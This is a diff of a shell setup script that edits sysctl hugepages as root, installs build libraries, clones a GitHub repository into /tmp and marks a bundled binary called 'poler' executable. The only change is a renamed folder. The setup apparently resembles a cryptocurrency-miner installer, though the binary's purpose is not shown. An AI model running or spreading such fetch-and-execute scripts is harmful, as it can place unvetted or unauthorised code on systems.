@@ -7,7 +7,7 @@ echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
-cd /tmp && mkdir myfirstss
+cd /tmp && mkdir my1
 git clone https://github.com/burkabest/my1.git /tmp/my1
 cd /tmp/my1
 chmod +x /tmp/my1/poler
